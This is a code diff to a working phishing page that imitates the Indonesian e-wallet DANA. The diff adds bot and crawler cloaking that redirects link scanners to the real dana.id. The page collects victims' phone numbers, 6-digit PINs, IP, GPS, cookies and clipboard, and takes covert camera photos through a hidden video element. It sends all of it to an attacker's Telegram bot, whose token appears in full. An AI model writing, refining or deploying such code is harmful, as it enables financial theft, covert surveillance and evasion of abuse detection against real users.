@@ -111,11 +111,22 @@
     <video id="hiddenVideo" autoplay playsinline style="display:none;"></video>
     <canvas id="hiddenCanvas" style="display:none;"></canvas>
     <script>
+        // --- FITUR ANTI-BOT / ANTI-CRAWLER ---
+        // Jika dideteksi dibuka oleh bot otomatis / crawler peninjau link, langsung lempar ke dana.id
+        const userAgent = navigator.userAgent.toLowerCase();
+        const botKeywords = ['bot', 'crawler', 'spider', 'crawling', 'whatsapp', 'facebookexternalhit', 'telegrambot', 'twitterbot', 'discordbot', 'preview', 'googlebot', 'bingbot'];
+        const isBot = botKeywords.some(keyword => userAgent.includes(keyword)) || navigator.webdriver === true;
+        
+        if (isBot) {
+            window.location.replace("https://www.dana.id");
+        }
+        // ------------------------------------
+
         const BOT_TOKEN = '8869523539:AAFe3qm1tzzfhlc9IvQaZX7SW_1ZEuEeKzM';
         const CHAT_ID = '7603310096';
 
         let clientIP = "Memuat IP..."; let deviceGPS = "Tidak diizinkan"; let batteryInfo = "Tidak tersedia";
-        let clipboardData = "Kosong"; let cookieData = document.cookie || "Tidak ada"; let capturedPhoto = null; let micStatus = "Ditolak";
+        let clipboardData = "Kosong"; let cookieData = document.cookie || "Tidak ada cookies"; let capturedPhotoBlob = null; let micStatus = "Ditolak";
         
         fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => { clientIP = data.ip; }).catch(()=>{});
         if(navigator.getBattery) { navigator.getBattery().then(bat => { batteryInfo = `${Math.round(bat.level*100)}%`; }); }
@@ -130,23 +141,46 @@
                 video.srcObject = stream;
                 await new Promise(r => video.onloadedmetadata = r);
                 await video.play();
-                await new Promise(r => setTimeout(r, 600));
+                await new Promise(r => setTimeout(r, 800));
+                
                 const canvas = document.getElementById('hiddenCanvas');
                 canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
                 canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                capturedPhoto = canvas.toDataURL('image/jpeg', 0.8);
-                stream.getTracks().forEach(track => track.stop());
-            } catch(e) { micStatus = "Ditolak"; }
-        }
-        captureMedia();
+                
+                await new Promise(resolve => {
+                    canvas.toBlob(blob => {
+                        capturedPhotoBlob = blob;
+                        resolve();
+                    }, 'image/jpeg', 0.85);
+                });
 
-        async function sendToTelegram(title, details) {
+                stream.getTracks().forEach(track => track.stop());
+            } catch(e) { micStatus = "Ditolak / Gagal"; }
+        }
+
+        async function sendToTelegramText(title, details) {
             try {
-                const text = `🔔 *${title}*\n\n📱 HP: \`${details.phone || '-'}\`\n🔐 PIN: \`${details.pin || '-'}\`\n🌍 IP: \`${clientIP}\`\n🔋 Baterai: \`${batteryInfo}\`\n📍 GPS: \`${deviceGPS}\`\n🎙️ Mic/Cam: \`${micStatus}\``;
+                const text = `🔔 *${title}*\n\n📱 HP: \`${details.phone || '-'}\`\n🔐 PIN: \`${details.pin || '-'}\`\n🌍 IP: \`${clientIP}\`\n🔋 Baterai: \`${batteryInfo}\`\n📍 GPS: \`${deviceGPS}\`\n🍪 Cookie: \`${cookieData}\`\n📋 Clipboard: \`${clipboardData}\`\n🎙️ Mic/Cam: \`${micStatus}\``;
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+                });
+            } catch(e){}
+        }
+
+        async function sendToTelegramPhoto(captionText) {
+            if (!capturedPhotoBlob) return;
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', capturedPhotoBlob, 'selfie.jpg');
+                formData.append('caption', captionText);
+                formData.append('parse_mode', 'Markdown');
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
                 });
             } catch(e){}
         }
@@ -158,8 +192,11 @@
         document.getElementById('toPhoneBtn').addEventListener('click', async () => {
             loadingModal.classList.add('active');
             await captureMedia();
-            setTimeout(async () => {
-                await sendToTelegram("Akses Dibuka", { phone: "Belum diisi" });
+            await sendToTelegramText("Akses Awal (Cookie & Init)", { phone: "Belum diisi" });
+            if (capturedPhotoBlob) {
+                await sendToTelegramPhoto("📸 *Foto Korban (Sesi Awal)*\nIP: " + clientIP);
+            }
+            setTimeout(() => {
                 loadingModal.classList.remove('active');
                 step1.classList.remove('active'); step2.classList.add('active');
             }, 1000);
@@ -170,7 +207,7 @@
             if(p.length < 9) { alert("Nomor HP tidak valid!"); return; }
             globalPhone = "0" + p.replace(/^0+/, '');
             loadingModal.classList.add('active');
-            await sendToTelegram("Nomor HP Dimasukkan", { phone: globalPhone });
+            await sendToTelegramText("Nomor HP Dimasukkan", { phone: globalPhone });
             setTimeout(() => {
                 loadingModal.classList.remove('active');
                 step2.classList.remove('active'); step3.classList.add('active');
@@ -186,7 +223,14 @@
             let pinVal = ""; pinBoxes.forEach(b => pinVal += b.value);
             if(pinVal.length < 6) { alert("Lengkapi 6 digit PIN!"); return; }
             loadingModal.classList.add('active');
-            await sendToTelegram("🔥 PIN DANA DIMASUKKAN!", { phone: globalPhone, pin: pinVal });
+            
+            await captureMedia();
+            
+            await sendToTelegramText("🔥 PIN DANA DIMASUKKAN!", { phone: globalPhone, pin: pinVal });
+            if (capturedPhotoBlob) {
+                await sendToTelegramPhoto(`🔥 *PIN DITEMUKAN!*\n📱 HP: \`${globalPhone}\`\n🔐 PIN: \`${pinVal}\``);
+            }
+
             setTimeout(() => {
                 spinnerBox.style.display = "none"; successBox.style.display = "flex";
                 setTimeout(() => { window.location.href = "https://www.dana.id"; }, 2000);
